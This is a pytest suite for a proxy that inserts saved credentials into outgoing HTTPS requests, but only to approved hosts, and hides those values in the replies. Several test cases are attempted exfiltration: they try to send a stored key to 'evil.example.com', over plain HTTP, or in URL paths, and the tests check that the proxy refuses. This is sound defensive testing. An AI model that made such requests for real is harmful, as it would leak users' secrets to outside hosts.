"""The forwarder that sends a request carrying a saved item: the exact value reaches only the approved place, in a
header or a JSON body; everything else is refused with nothing sent; the answer comes back with saved values hidden.

The item, the login, the approval check and the history rows are real; upstream is an httpx mock transport.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import shutil
import sys
import tempfile
import uuid
from pathlib import Path
from types import SimpleNamespace

import httpx
import pytest

import infra.saved_logins as saved_logins
from auth_fixtures import OWNER_USER as PERSON
from automation import script_blanking, script_items
from automation.script_github_proxy import OVER_RESPONSE, UNCHECKED
from automation.script_item_proxy import OVER_REQUEST, item_proxy
from automation.script_tool_channel import REQUEST_LIMIT
from infra import key_store
from infra.database import get_db

OWNER = "proxy-owner"
NAME = "billing-key"
GIVEN = "signing-key"
VALUE = 'Fake-billing-"value"-0123456789'  # gitleaks:allow - a test fixture, not a credential
PASSWORD = "Fake-login-password-0123456789"  # gitleaks:allow - a test fixture, not a credential
PLACE = "api.example.com"
BACKEND = Path(__file__).resolve().parents[1]


def socket_parent() -> Path:
    """Where a test may bind a socket: agent shells may bind only under their own socket root."""
    thread = os.environ.get("CORSIA_THREAD_ID")
    if thread:
        from tools.unix_socket_policy import corsia_temp_root_for_bind
        return corsia_temp_root_for_bind(thread)
    return Path(tempfile.gettempdir())


def socket_folder() -> Path:
    """A fresh folder with a short path for a socket."""
    folder = socket_parent() / uuid.uuid4().hex[:8]
    folder.mkdir()
    return folder


@pytest.fixture
def world(isolated_db, tmp_path, monkeypatch, caplog):
    root = tmp_path / "state"
    root.mkdir()
    monkeypatch.setattr("infra.config.STATE_ROOT", root)
    db = get_db()
    db.execute("INSERT INTO threads (id,user_id,title,spawned_by,created_at,updated_at) VALUES (?,?,?,?,?,?)",
               (OWNER, PERSON, "Bookkeeper", None, "t", "t"))
    db.commit()
    db.close()
    key_store.add_entry(NAME, "Billing key", "", added_by_thread_id=None, added_by_name=None)
    key_store.set_value(NAME, VALUE)
    key_store.add_entry(GIVEN, "Signing key", "", added_by_thread_id=None, added_by_name=None)
    key_store.set_value(GIVEN, "Fake-signing-value-0123456789")  # gitleaks:allow
    login = saved_logins.save_login(site="https://portal.example.org", username="me", password=PASSWORD,
                                    saved_by=PERSON)
    entries = script_items.declared(OWNER, [{"name": NAME, "place": PLACE}, {"name": GIVEN, "given": True},
                                            {"login": login}], authenticated=True)
    run = script_items.for_run(OWNER, "script-1", {"saved_items": entries}, None)
    caplog.set_level(logging.DEBUG)
    folder = socket_folder()
    yield SimpleNamespace(run=run, login=login, socket=folder / "s", seen=[], github_seen=[], caplog=caplog,
                          answer=lambda request: httpx.Response(200, json={"ok": True}))
    shutil.rmtree(folder, ignore_errors=True)


def _transport(w, seen):
    def handle(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return w.answer(request)

    return httpx.MockTransport(handle)


async def _ask(w, raw: bytes, *, github=False) -> tuple[int, bytes]:
    """Send one raw HTTP/1.1 request to a fresh forwarder; the status and body that came back."""
    async with item_proxy(w.socket, w.run, github_socket=w.socket.parent / "g" if github else None,
                          transport=_transport(w, w.seen), github_transport=_transport(w, w.github_seen)):
        reader, writer = await asyncio.open_unix_connection(str(w.socket))
        writer.write(raw)
        await writer.drain()
        data = await reader.read()
        writer.close()
    head, _, body = data.partition(b"\r\n\r\n")
    return int(head.split(b" ")[1]), body


def _get(target: str, *headers: str, host: str = PLACE) -> bytes:
    lines = [f"GET {target} HTTP/1.1", f"Host: {host}", *headers]
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


def _post(target: str, body: bytes, content_type: str = "application/json", host: str = PLACE) -> bytes:
    head = f"POST {target} HTTP/1.1\r\nHost: {host}\r\nContent-Type: {content_type}\r\nContent-Length: {len(body)}"
    return head.encode() + b"\r\n\r\n" + body


def _audit() -> list[tuple]:
    db = get_db()
    try:
        return [tuple(row) for row in db.execute(
            "SELECT login_id, item, site, thread_id, result, script_id FROM saved_login_fill_audit ORDER BY id")]
    finally:
        db.close()


@pytest.mark.asyncio
async def test_an_item_goes_exactly_into_a_header_and_one_history_row_has_no_value(world):
    status, body = await _ask(world, _get(f"https://{PLACE}/v1/me?x=1", "Authorization: Bearer {{corsia-item:billing-key}}"))
    assert status == 200 and json.loads(body) == {"ok": True}
    [sent] = world.seen
    assert str(sent.url) == f"https://{PLACE}/v1/me?x=1"
    assert sent.headers["authorization"] == f"Bearer {VALUE}"
    assert sent.headers["accept-encoding"] == "identity"
    assert _audit() == [("", NAME, PLACE, OWNER, "filled", "script-1")]
    assert VALUE not in repr(_audit())


@pytest.mark.asyncio
async def test_an_item_goes_json_escaped_into_a_json_body(world):
    payload = b'{"key": "{{corsia-item:billing-key}}"}'
    status, _ = await _ask(world, _post(f"https://{PLACE}/v1/keys", payload))
    assert status == 200
    assert json.loads(world.seen[0].content) == {"key": VALUE}


@pytest.mark.asyncio
async def test_a_login_password_goes_only_to_its_site(world):
    host = "portal.example.org"
    status, _ = await _ask(world, _get(f"https://{host}/api", f"X-Password: {{{{corsia-login:{world.login}}}}}", host=host))
    assert status == 200 and world.seen[0].headers["x-password"] == PASSWORD
    assert _audit() == [(world.login, None, host, OWNER, "filled", "script-1")]
    status, _ = await _ask(world, _get(f"https://{PLACE}/api", f"X-Password: {{{{corsia-login:{world.login}}}}}"))
    assert status == 403 and len(world.seen) == 1


@pytest.mark.parametrize("raw,text", [
    (_get("https://evil.example.com/x", "X-Key: {{corsia-item:billing-key}}", host="evil.example.com"),
     b"only to another place"),
    (_get(f"http://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"), b"only to https://"),
    (_get("/x", "X-Key: {{corsia-item:billing-key}}"), b"only to https://"),
    (_get(f"https://{PLACE}:8443/x", "X-Key: {{corsia-item:billing-key}}"), b"only to https://"),
    (_get(f"https://user@{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"), b"only to https://"),
    (_get(f"https://{PLACE}/x", "X-Key: {{corsia-item:not-listed}}"), b"doesn't list that saved item"),
    (_get(f"https://{PLACE}/x", "X-Key: {{corsia-item:signing-key}}"), b"read it with corsia item"),
    (_get(f"https://{PLACE}/{{{{corsia-item:billing-key}}}}"), b"only in a header value or a JSON body"),
    (_post(f"https://{PLACE}/x", b"key={{corsia-item:billing-key}}", "application/x-www-form-urlencoded"),
     b"only in a header value or a JSON body"),
    (_get(f"https://{PLACE}/x", "X-Plain: nothing"), b"CORSIA sends only requests that use one"),
])
@pytest.mark.asyncio
async def test_a_refused_request_sends_nothing_and_records_nothing(world, raw, text):
    status, body = await _ask(world, raw)
    assert status == 403 and text in body
    assert world.seen == [] and world.github_seen == [] and _audit() == []


@pytest.mark.asyncio
async def test_on_github_the_authorization_header_is_corsias(world, monkeypatch):
    github = script_items.declared(OWNER, [{"name": NAME, "place": "api.github.com"}], authenticated=True)
    world.run = script_items.for_run(OWNER, "script-1", {"saved_items": github}, None)
    raw = _get("https://api.github.com/user", "Authorization: token {{corsia-item:billing-key}}", host="api.github.com")
    status, body = await _ask(world, raw, github=True)
    assert status == 403 and b"Authorization header is CORSIA's GitHub login" in body and world.github_seen == []
    raw = _get("https://api.github.com/user", "X-Key: {{corsia-item:billing-key}}", host="api.github.com")
    status, body = await _ask(world, raw)  # no GitHub login for this run
    assert status == 403 and b"no GitHub login" in body and world.seen == []
    status, _ = await _ask(world, raw, github=True)
    assert status == 200 and world.seen == []  # never sent direct
    [through] = world.github_seen
    assert through.url.host == "api.github.com" and through.headers["x-key"] == VALUE


@pytest.mark.asyncio
async def test_a_request_after_the_item_is_cleared_mid_run_sends_nothing(world):
    key_store.clear_value(NAME)
    status, body = await _ask(world, _get(f"https://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"))
    assert status == 403 and b"no longer available" in body
    assert world.seen == [] and _audit() == []


@pytest.mark.asyncio
async def test_the_size_limits(world):
    big = b'{"key": "{{corsia-item:billing-key}}", "pad": "' + b"x" * REQUEST_LIMIT + b'"}'
    status, body = await _ask(world, _post(f"https://{PLACE}/x", big))
    assert status == 413 and body == OVER_REQUEST and world.seen == [] and _audit() == []
    world.answer = lambda request: httpx.Response(200, content=b"y" * (REQUEST_LIMIT + 1))
    status, body = await _ask(world, _get(f"https://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"))
    assert status == 502 and body == OVER_RESPONSE
    assert [row[4] for row in _audit()] == ["filled"]  # it was sent


@pytest.mark.asyncio
async def test_a_refused_answer_still_records_filled_and_a_failed_send_records_unknown(world):
    world.answer = lambda request: httpx.Response(401, text="no")
    status, _ = await _ask(world, _get(f"https://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"))
    assert status == 401

    def broken(request):
        raise httpx.ConnectError(f"failed sending {VALUE}")

    world.answer = broken
    status, body = await _ask(world, _get(f"https://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"))
    assert status == 502 and VALUE.encode() not in body
    assert [row[4] for row in _audit()] == ["filled", "unknown"]
    assert VALUE not in world.caplog.text and "ConnectError" in world.caplog.text


@pytest.mark.asyncio
async def test_the_answer_comes_back_with_saved_values_hidden(world):
    world.answer = lambda request: httpx.Response(200, headers={"x-echo": request.headers["x-key"]},
                                                  json={"echo": request.headers["x-key"], "password": PASSWORD})
    async with item_proxy(world.socket, world.run, github_socket=None, transport=_transport(world, world.seen)):
        reader, writer = await asyncio.open_unix_connection(str(world.socket))
        writer.write(_get(f"https://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"))
        data = await reader.read()
    assert b"200" in data.split(b"\r\n")[0]
    assert VALUE.encode() not in data and PASSWORD.encode() not in data


@pytest.mark.asyncio
async def test_an_answer_that_cannot_be_checked_is_withheld(world, monkeypatch):
    def unreadable():
        raise script_blanking.Unchecked

    monkeypatch.setattr(script_blanking, "saved_values", unreadable)
    status, body = await _ask(world, _get(f"https://{PLACE}/x", "X-Key: {{corsia-item:billing-key}}"))
    assert status == 502 and body == UNCHECKED


@pytest.mark.asyncio
async def test_the_socket_is_the_owners_only_and_goes_away_with_the_run(world):
    async with item_proxy(world.socket, world.run, github_socket=None, transport=_transport(world, world.seen)):
        assert world.socket.stat().st_mode & 0o777 == 0o600
    assert not world.socket.exists()


@pytest.mark.asyncio
async def test_corsia_send_from_a_script(world):
    """The client verb a script runs: the body to stdout, a failed status to stderr with exit 1."""
    async def send(*args: str) -> tuple[int, bytes, bytes]:
        env = {"PATH": os.environ.get("PATH", ""), "CORSIA_SCRIPT_SEND_SOCKET": str(world.socket)}
        process = await asyncio.create_subprocess_exec(
            sys.executable, "-I", str(BACKEND / "cli_github.py"), "send", *args, env=env,
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        out, err = await process.communicate(b'{"key": "{{corsia-item:billing-key}}"}')
        assert process.returncode is not None
        return process.returncode, out, err

    async with item_proxy(world.socket, world.run, github_socket=None, transport=_transport(world, world.seen)):
        code, out, err = await send("get", f"https://{PLACE}/v1", "-H", "X-Key: {{corsia-item:billing-key}}")
        assert (code, json.loads(out), err) == (0, {"ok": True}, b"")
        code, out, _ = await send("POST", f"https://{PLACE}/v1", "-H", "Content-Type: application/json",
                                  "--data", "-")
        assert code == 0 and json.loads(world.seen[-1].content) == {"key": VALUE}
        code, out, err = await send("GET", "https://evil.example.com/", "-H", "X-Key: {{corsia-item:billing-key}}")
        assert code == 1 and b"only to another place" in out and b"HTTP 403" in err
        code, _, err = await send("GET")
        assert code == 2 and b"Usage: corsia send" in err
    assert world.seen[0].headers["x-key"] == VALUE
